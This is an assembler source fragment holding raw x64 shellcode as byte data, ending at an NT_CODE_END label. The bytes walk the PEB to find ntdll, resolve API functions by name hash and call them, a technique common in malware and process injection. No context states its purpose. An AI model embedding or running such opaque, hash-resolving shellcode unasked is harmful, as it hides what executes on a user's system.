db     0x48, 0x81, 0xEC, 0x98, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x30, 0xE8, 0x03, 0x01, 0x00,
db     0x00, 0x48, 0x83, 0x64, 0x24, 0x28, 0x00, 0x4C, 0x8D, 0x4C, 0x24, 0x30, 0x83, 0x64, 0x24, 0x20,
db     0x00, 0x4C, 0x8D, 0x05, 0x0C, 0x03, 0x00, 0x00, 0x33, 0xD2, 0x33, 0xC9, 0xFF, 0x94, 0x24, 0x80,
db     0x00, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0x98, 0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC,
db     0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48,
db     0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x63, 0x41, 0x3C, 0x4C, 0x8B, 0xC9,
db     0x49, 0x8B, 0xD8, 0x8B, 0xEA, 0x8B, 0x8C, 0x08, 0x88, 0x00, 0x00, 0x00, 0x85, 0xC9, 0x74, 0x6B,
db     0x42, 0x83, 0xBC, 0x08, 0x8C, 0x00, 0x00, 0x00, 0x00, 0x74, 0x60, 0x49, 0x8D, 0x04, 0x09, 0x44,
db     0x8B, 0x58, 0x18, 0x45, 0x85, 0xDB, 0x74, 0x53, 0x8B, 0x48, 0x20, 0x45, 0x33, 0xC0, 0x8B, 0x78,
db     0x1C, 0x49, 0x03, 0xC9, 0x8B, 0x70, 0x24, 0x49, 0x03, 0xF9, 0x49, 0x03, 0xF1, 0x45, 0x85, 0xDB,
db     0x74, 0x39, 0x44, 0x8B, 0x11, 0x4D, 0x03, 0xD1, 0x4D, 0x8B, 0xF2, 0x33, 0xD2, 0x41, 0x8A, 0x02,
db     0xEB, 0x11, 0x69, 0xD2, 0x83, 0x00, 0x00, 0x00, 0x0F, 0xBE, 0xC0, 0x03, 0xD0, 0x49, 0xFF, 0xC6,
db     0x41, 0x8A, 0x06, 0x84, 0xC0, 0x75, 0xEB, 0x0F, 0xBA, 0xF2, 0x1F, 0x3B, 0xEA, 0x74, 0x29, 0x41,
db     0xFF, 0xC0, 0x48, 0x83, 0xC1, 0x04, 0x45, 0x3B, 0xC3, 0x72, 0xC7, 0x33, 0xC0, 0x48, 0x8B, 0x5C,
db     0x24, 0x30, 0x48, 0x8B, 0x6C, 0x24, 0x38, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48, 0x8B, 0x7C, 0x24,
db     0x48, 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5E, 0xC3, 0x48, 0x85, 0xDB, 0x74, 0x0A, 0x49, 0x8B, 0xD2,
db     0x49, 0x8B, 0xC9, 0xFF, 0xD3, 0xEB, 0xD6, 0x42, 0x0F, 0xB7, 0x0C, 0x46, 0x8B, 0x04, 0x8F, 0x49,
db     0x03, 0xC1, 0xEB, 0xC9, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x57,
db     0x48, 0x83, 0xEC, 0x30, 0xC7, 0x40, 0xE8, 0x6E, 0x74, 0x64, 0x6C, 0x48, 0x8B, 0xF1, 0xC7, 0x40,
db     0xEC, 0x6C, 0x2E, 0x64, 0x6C, 0x45, 0x33, 0xC0, 0x66, 0xC7, 0x40, 0xF0, 0x6C, 0x00, 0xBA, 0x78,
db     0x1F, 0x20, 0x7F, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x48, 0x18,
db     0x48, 0x8B, 0x41, 0x30, 0x48, 0x8B, 0x08, 0x48, 0x8B, 0x01, 0x48, 0x8B, 0x78, 0x10, 0x48, 0x8B,
db     0xCF, 0x48, 0x89, 0x3E, 0xE8, 0xD7, 0xFE, 0xFF, 0xFF, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x46, 0x08,
db     0xBA, 0x54, 0xB8, 0xB9, 0x1A, 0x48, 0x8B, 0xCF, 0xE8, 0xC3, 0xFE, 0xFF, 0xFF, 0x45, 0x33, 0xC0,
db     0x48, 0x89, 0x46, 0x10, 0xBA, 0x62, 0x34, 0x89, 0x5E, 0x48, 0x8B, 0xCF, 0xE8, 0xAF, 0xFE, 0xFF,
db     0xFF, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x46, 0x28, 0xBA, 0x73, 0x80, 0x48, 0x06, 0x48, 0x8B, 0xCF,
db     0xE8, 0x9B, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x89, 0x46, 0x30, 0xFF, 0x56,
db     0x08, 0x4C, 0x8B, 0x46, 0x10, 0xBA, 0xCB, 0x79, 0xB5, 0x0D, 0x48, 0x8B, 0xC8, 0x48, 0x8B, 0xD8,
db     0xE8, 0x7B, 0xFE, 0xFF, 0xFF, 0x4C, 0x8B, 0x46, 0x10, 0xBA, 0xC0, 0xE9, 0x18, 0x15, 0x48, 0x8B,
db     0xCB, 0x48, 0x89, 0x46, 0x18, 0xE8, 0x66, 0xFE, 0xFF, 0xFF, 0x45, 0x33, 0xC0, 0x48, 0x89, 0x46,
db     0x20, 0xBA, 0xC9, 0xCA, 0x38, 0x26, 0x48, 0x8B, 0xCF, 0xE8, 0x52, 0xFE, 0xFF, 0xFF, 0x4C, 0x8B,
db     0x46, 0x10, 0xBA, 0x5A, 0x5A, 0x51, 0x09, 0x48, 0x8B, 0xCF, 0x48, 0x89, 0x46, 0x38, 0xE8, 0x3D,
db     0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x89, 0x46, 0x50, 0x48, 0x8B, 0x74, 0x24,
db     0x48, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3, 0xCC 

NT_CODE_END:


